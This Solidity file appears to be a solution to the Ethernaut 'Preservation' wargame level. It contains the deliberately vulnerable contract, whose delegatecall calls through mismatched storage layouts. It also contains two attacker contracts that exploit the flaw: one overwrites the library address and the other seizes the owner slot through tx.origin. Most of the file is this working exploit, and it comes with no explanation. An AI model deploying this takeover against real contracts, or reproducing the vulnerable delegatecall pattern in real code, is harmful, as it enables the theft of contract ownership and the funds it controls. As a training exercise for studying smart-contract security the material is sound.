pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

contract PreservationPunisher {
    function Punish(address _target,uint Rewriter) public {
        Preservation target = Preservation(_target);/* Preservation instance address */
        target.setFirstTime(Rewriter);/* Rewrite timeZone1Library to LocalVariableRewritter address */
        target.setFirstTime(0);/* Let LocalVariableRewritte work */
    }
}

contract LocalVariableRewriter {
  address public padding1;
  address public padding2;
  address public owner;

  function setTime(uint playerAddress) public {
    owner = tx.origin;
  }
}